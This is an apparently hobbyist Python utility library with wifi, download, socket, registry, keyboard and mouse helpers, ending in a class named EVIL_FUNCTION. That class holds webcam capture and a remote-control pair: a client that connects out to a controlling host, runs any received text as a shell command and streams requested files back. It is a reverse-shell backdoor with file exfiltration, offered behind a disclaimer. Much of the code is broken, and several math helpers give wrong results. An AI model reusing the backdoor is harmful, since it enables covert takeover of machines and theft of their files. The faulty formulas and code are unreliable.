import json
import os
import sys
import time
from multiprocessing.dummy import Process
from socket import AF_INET as SAI
from socket import SOCK_STREAM as ST
from socket import gethostbyname, gethostname, socket
from threading import Thread
from time import sleep
from winsound import SND_ASYNC, PlaySound
import pycuda
import cv2
from PIL import Image
from pyperclip import *
from pywifi import Profile, PyWiFi
from pywifi import const as wific_
from requests import get, head
from win32api import *
from win32con import *

print("This is a moudle for noob,it is packing a lot of function")
print("by Github:CXK114514BLACKER")
print("作者：bilibili：电脑君h")
class about:
    def dictionary():
        dic="""
        ===================================================================
        maker unknown what thing he can do in the summer holiday
        so he make the library
        like you see
        his english is verrrrrrrry poor
        so you can see some variable/annotation name you unknown it's mean
        even the dictionary you unknown it's mean
        ===================================================================
        why does him do the package?
        [
            one day,he is writing his code
            he look the file 1gb size
            and he fell into contemplation
            so he want to to make a library
            pack some function
            if he want to use function
            he only need input a function into his code
            (
                he is really lazy
            )
        ]
        What do you need to use this package?
        [
            coffin
            and googletranslator
            (
                I also don't know why I make a package not people use it
                and I !can speak english
            )
        ]
        ===================================================================
        import sponsored
        pubilc class main{
            pubilc static vold main(){
                while(1){
                    sponsored("CXK114514BLACKER")
                    //github:https://github.com/CXK114514BLACKER/EasyPython
                    //gitee:https://gitee.com/sxc114514/easypython
                    //E-mail:sunxiaochuan327@163.com
                    
                }
            }
        }
        """
        print(dic)
class hard:
    class wifi:
        class WIFIAKM:
            NONE=wific_.AKM_TYPE_NONE
            WPA=wific_.AKM_TYPE_WPA
            WPA2=wific_.AKM_TYPE_WPA2
            WPA2PSK=wific_.AKM_TYPE_WPA2PSK#wifi password type
        class CIPHER:#wifi cipher(if not have special need please use ccmp)
            CCMP=wific_.CIPHER_TYPE_CCMP
            NONE=wific_.CIPHER_TYPE_NONE
            TKIP=wific_.CIPHER_TYPE_TKIP
            UNKNOWN=wific_.CIPHER_TYPE_UNKNOWN
            WEP=wific_.CIPHER_TYPE_WEP
        class WIFIAUTH:#you only need open(shared also not problen,but you need input 6 α)
            OPEN=wific_.AUTH_ALG_OPEN
            SHARED=wific_.AUTH_ALG_SHARED
        class wifiinterface:
            def __init__(self,interface=0) :
                self.interfaces=PyWiFi()
                self.REAIf_=self.interfaces[interface]#choose interface
                return
            def connectwifi(self,AKM,SSID,KEY,CIPHER=wific_.CIPHER_TYPE_CCMP,AUTH=wific_.AUTH_ALG_OPEN,discbuftime=1,conbuftime=2,interface=0):
                self.REAIf_.disconnect()#disconnect wifi for next connect
                sleep(discbuftime)#wait disconnect
                if self.REAIf_.status==wific_.IFACE_DISCONNECTED:
                    PF=Profile()#define profile
                    PF.akm.append(AKM)
                    PF.auth=AUTH
                    PF.ssid=SSID
                    PF.key=KEY
                    PF.cipher=CIPHER
                    TEP=self.REAIf_.ifaces.add_network_profile(PF)
                    self.REAIf_.connect(TEP)#connect
                if self.REAIf_.status==wific_.IFACE_CONNECTED:
                    return True
                else:
                    return False
            def disconnetwifi(self):
                self.REAIf_.disconnect()
    class image:#test function,I also don't know code there's mean,unless you have specital need,otherwise don't use it
        def __init__(self,imagefilename):
            img=Image.open(imagefilename)
            imgfn=imagefilename
            return
        def imgformat(self,dir,toformat="png"):
            self.img.save(dir+self.imgfn.split(".")[1]+toformat)
        def imgchange(self,mode):
            return self.img.convert(mode)
        def imgcut(self,ax,ay,bx,by):
            return self.img.crop(box=(ax,ay,bx,by))
    class download:
        def download(url,path):
            u=get(url=url)
            file=path+"\\{}".format(url.split("/")[-1])
            with open(file,"wb+") as f:
                f.write(u.content)
            return True
        def muilthreaddownload(url,path,threadpcs=8):
            file=(path+"\\{}".format(url.split("/")[-1]))
            threadlist=[]
            def threadfunc(function,args):#use new thread to open function
                thread=Thread(target=function,args=args)
                threadlist.append(thread)
                thread.start()
            def WAy(file,start,end):#download chunk
                data_=get(url=url,headers={"Range":f"bytes={start}-{end}"})#headers
                with open(file=file,mode="rb+") as f_:#open file
                    f_.seek(start)#move to start place
                    f_.write(data_.content)#write data
            size=int(head(url=url).headers["Content-Length"])#get flie size by bytes
            print(size)
            chunksize=size//threadpcs#split file
            print(chunksize)
            with open(file=file,mode="wb"):#create file
                pass
            for s_ in range(threadpcs):#start download
                threadfunc(WAy,args=(file,s_*chunksize,(s_+1)*chunksize))
            return True
    class internet:
        def getip():
            return gethostbyname()
        class server_and_client:
            class server(object):
                def __init__(self,port,ip):
                    self.ser=socket(SAI,ST)#create socket and bind host and port
                    self.ser.bind((ip,port))
                    return
                def startlisten(self,denyip=[],denymessage="YOUR REQUEST WAS REFUSED"):
                    self.ser.listen(self.port)
                    client,clientdata=self.ser.accept()#connect to client
                    if clientdata[0] in denyip:#testfor client in denyip
                        client.send(denymessage.encode(encoding="utf-8"))#send data encode to utf8
                        client.close()#close connect for client
                    else:
                        return client
                def senddata(data,client):
                    client.send(data)
                def getdata(client,datapacklimit=1024):
                    msg=client.recv(datapacklimit)#get data from client (default limit 1024 bytes)
                    return msg
                def closeconnect(client):
                    client.close()
            class client(object):
                def __init__(self,port,ip):
                    self.cli=socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.cli.bind((ip,port))
                def connectserver(self,ip,port):
                    try:
                        self.cli.connect((ip,port))
                        return 1#if connect sucess return True
                    except:
                        return 0
                def getdata(self,datapacklimit):
                    return self.cli.recv(datapacklimit)#need yourself to decode
                def send(self,data):
                    self.cli.send(data)
                def close(self):
                    self.cli.close()
class useless:
    class string:
        def swap(string):
            __Str__=""#string_2
            for str_ in string:
                __Str__=str_+__Str__#stitch
            return __Str__
        def seektowrite(string,start,item):
            __Str__=string
            str2_=__Str__[(start+len(item)):]#over
            str3_=__Str__[:start]+item+str2_#stitch
            return str3_
    class math:
        class mathconst:
            Π=3.14
            pi=Π
            homo=114514
            homo_2=1919810
        class graphics:
            class size:
                def circlesize(radius):
                    return (radius**2)*useless.math.mathconst.Π
                def fansize(radius,angle):
                    return (radius**2)*useless.math.mathconst.Π/360*angle
                def halfcirclesize(radius):
                    return (radius**2)*useless.math.mathconst.Π/2
                def polygonsize(radius,edgelong,edgepcs):
                    return (radius*edgelong)/2*edgepcs
                def eclipsesize(radius1,radius2):
                    return (radius1*radius2)*useless.math.mathconst.Π
            class sidelength:
                def circleSL(radius):
                    return radius*2*useless.math.mathconst.Π
                def fanSL(radius,angle):
                    return ((radius*2*useless.math.mathconst.Π)/360*angle)+(radius*2)
                def halfcircleSL(radius):
                    (radius*useless.math.mathconst.Π)+(radius*2)
                def eclipsesSL(longradius,shortradius):
                    return ((longradius-shortradius)*4)+(2**shortradius)
        class solidgraphics:
            def ball(radius):
                return (4/3)**(radius**3)
    class thread:
        def ntrun(func):#no args(decoration edition????)
            __ThreaD__=Thread(target=func)
            __ThreaD__.start()
            return __ThreaD__
        def overreturn_ntrun(func):
            __ThreaD__=Thread(target=func)
            __ThreaD__.start()
            __ThreaD__.join()
            return __ThreaD__
        def ntrun_arg(func,args):#can add args
            __ThreaD__=Thread(target=func,args=args)
            __ThreaD__.start()
            return __ThreaD__
        def overreturn_ntrun_arg(func,args):#let the program not explode and wait thread over(no return thread)
            __ThreaD__=Thread(target=func,args=args)
            __ThreaD__.start()
            __ThreaD__.join()
            return 1
    class process:
        def killprocess(processname):
            os.system(f"taskkill /f /im {processname}")
        def killprocess_pid(processpid):
            os.system(f"taskkill /f /im pid {processpid}")
        #use system command to kill command
        def startnewprocess(target):
            __pro__=Process(target=target)
            __pro__.start()
            return __pro__
        #return process to let other fun use it
class SystemAPI:
    class Mouse_and_Keyboard:
        class KeyConst:
            a,b,c,d=65,66,67,68
            e,f,g,h=69,70,71,72
            i,j,k,l=73,74,75,76
            m,n,o,p=77,78,79,80
            q,r,s,t=81,82,83,84
            u,v,w,x=85,86,87,88
            y,z=89,90
            n0,n1,n2,n3,n4,n5,n6,n7,n8,n9=48,49,50,51,52,53,54,55,56,57
            backspace,tab,clear,enter=8,9,12,13
            shift,control,alt,capslock,escape,space=16,17,18,20,27,32
        class Mouse:
            MRIGHT=[MOUSEEVENTF_RIGHTDOWN,MOUSEEVENTF_RIGHTUP]
            MLEFT=[MOUSEEVENTF_LEFTDOWN,MOUSEEVENTF_LEFTUP]
            MMIDDLE=[MOUSEEVENTF_MIDDLEDOWN,MOUSEEVENTF_MIDDLEUP]
            def getmouseselection():
                copy=paste()#getcopyitem
                keybd_event(SystemAPI.Mouse_and_Keyboard.KeyConst.control,0,0,0)
                keybd_event(SystemAPI.Mouse_and_Keyboard.KeyConst.c,0,0,0)#press down Ctrl+c
                keybd_event(SystemAPI.Mouse_and_Keyboard.KeyConst.control,0,KEYEVENTF_KEYUP,0)
                keybd_event(SystemAPI.Mouse_and_Keyboard.KeyConst.c,0,KEYEVENTF_KEYUP,0)#release key
                select=paste()
                copy(copy)
                return(select)#return select
            def getmouseplace():
                mp=GetCursorPos()
                x=mp[0]
                y=mp[1]
                return {"x":x,"y":y}
            def movemouse(x,y):
                SetCursorPos((x,y))
            def click(button,time=0.01):
                mouse_event(button[0],0,0,0,0)#click down mouse
                sleep(time)#wait
                mouse_event(button[1],0,0,0,0)#release mouse
        class Keyboard:
            def click(button,time=0.01):#can use the const library "SystemAPI.Mouse_and_Keyboard.KeyConst"
                keybd_event(button,0,0,0)
                sleep(time)
                keybd_event(button,0,KEYEVENTF_KEYUP,0)
    class Register:
        class RegConst:
            READ=KEY_READ
            WRITE=KEY_WRITE
            DEFAULT=1
            SZ=REG_SZ
            BINRAY=REG_BINARY
            DWORD=REG_DWORD
        class OpenReg(object):
            def __init__(self,root,path,flags) :
                self.Reg=RegOpenKeyEx(root,path,0,flags)
                self.root=root
                self.path=path
                self.flags=flags
                return 
                #root:head key(such as "HKEY_USERS")
                #path:key path(such as "SOFTWARE\Microsoft\.NETFramework")
                #flags:Open flags(Such as READ)
            #use self.Reg 
            def SetValue(self,ValueName,Value,ValueType=REG_DWORD):
                RegSetValueEx(self.Reg,ValueName,0,ValueType,Value)
                #default type:dword
                #Set self's Value
            def ReadValue(self,ValueName):
                return RegQueryValueEx(self.Reg,ValueName)
                #read self's value and return
            def CreateKey(self,KeyName):
                RegCreateKey(self.Reg,KeyName)
            def RemoveKey(self,KeyName):
                RegDeleteKey(self.Reg,KeyName)
            def CloseKey(self,ReturnSelf=True):
                RegCloseKey(self.Reg)#close self's key
                if ReturnSelf:
                    return self
                del self#remove self
    class GPU(object):
        def __init__(self) :
            fuck="""
            you only need numba to use GPU compute
            (
                #DEMOOOOOOOOOOOOOOOOOOOOOOO
                import numba.jit
                @numba.jit #<-ADD IT!!!!!!!
                def function(arg1,arg2):
                    return arg1+arg2
                    #GPU ONLY CAN COMPUTE NUMBER
            )
            But WHY YOU THINK I CAN DO SOMETHING I NEEDN'T DO?
            I CAN'T MAKE THIS FUNCTION FOREVER
            UNLESS YOU DONATE 100$ LOL
            """
            print(fuck)
class EVIL_FUNCTION:
    """
    =======================================================!!!!!FBI WARNING!!!!!=======================================================
    these function is maker(github:CXK114514BLACKER) development when he is bored,
    don't use it to do something illegal,
    I will not responsibility!!!
    If you go into the prison,don't F__K tell me!!!
    I never help you responsibility!!!
    I wish you use the functions to study/safe test,
    Instead of use it to do something ILLEGAL!!!!!!!!!

    And I never test these function,
    so if you find the bug
    please tell me from the E-Mail
    (my E-Mail:sunxiaochuan327@163.com)
    =================================================================================================================================
    """
    class camera(object):
        def __init__(self,camindex=0) :
            cam=cv2.VideoCapture(camindex)
            return
        def getframe(self):
            ref,frame=self.cam.read()
            return frame
    class remotecontrol:
    #this is hecker machine
        class controller(object):
            def __init__(self,wcip,port) :
                self.soc=socket(SAI,ST)#create a new socket
                cn=gethostname()#get self machine name
                selfip=gethostbyname(cn)#get self ip
                self.soc.bind((cn,port))#bind ip
                self.soc.listen(1)#wait client
                self.cli,self.address=self.soc.accept()#accpet client
                return
            def sendcommand(self,command):
                self.cli.send(command.encode("utf-8"))#send command
                self.cli.recv(65536)#get return
            def overcontrol(self,returnself=1):
                self.cli.send("close")
                self.cli.close()#close connect
                if returnself==1:
                    return self
                del self#release memory
            def readdiskdata(self,filename,savepath):
                def threadfun():
                    self.cli.send(f"readdiskdata={filename}".encode("utf-8"))#send command
                    GD=self.cli.recv(1024).decode("utf-8")#decode th string
                    if GD=="finddata":
                        self.cli.send("start")#start read
                        with open(file=filename.split("\\")[-1],mode="ab") as file:
                            while 1:
                                self.cli.send("next")
                                data=self.cli.recv(65536)#get data
                                try:
                                    if data.decode("utf-8")=="over":
                                        file.close()#close file to release memory
                                        self.cli.send("over")
                                        break
                                except:
                                    file.write(data)#write data into file
                                    file.flush()#wait write over
                            return 1
                    elif GD=="ERROR:File_Not_Found":
                        self.cli.send("contiune")
                        raise FileNotFoundError(f"Cannot found file {filename}")
                thread=Thread(target=threadfun)
                thread.start()
#this is control machine
        class contclient(object):
            def __init__(self,controllerip,port,returnself=1) :
                soc=socket(SAI,ST)
                soc.connect((controllerip,port))#connect to hecker's machine
                def controlthread():#use muilttherad run to let program not lag
                    while 1:
                        command=soc.recv(65536).decode("utf-8")
                        if command=="close":
                            soc.close()
                            if returnself==1:
                                return self
                            break
                        elif "readdiskdata=" in command:
                            filename=command.split("=")[1]#filename
                            try:
                                filedata=open(filename,"rb")
                                soc.send("finddata".encode("utf-8"))
                            except FileNotFoundError:
                                soc.send("ERROR:File_Not_Found".encode("utf-8"))#returnERROR
                            DG=soc.recv(1024).decode("utf-8")#listen start
                            if DG=="start":
                                while 1:
                                    data=filedata.read(65536)
                                    if not data:#data read over
                                        soc.send("over".encode("utf-8"))#send over
                                        break
                                    else:
                                        lsd=soc.recv(1024)#listen
                                        if lsd=="next":#listen next command
                                            soc.send(data)
                                        elif lsd=="over":
                                            break#over write while
                            elif DG=="continue":#raise
                                continue
                        else:
                            os.system(command=command)
                    del self
                thread=Thread(target=controlthread)
                thread.start()
SystemAPI.GPU()


                

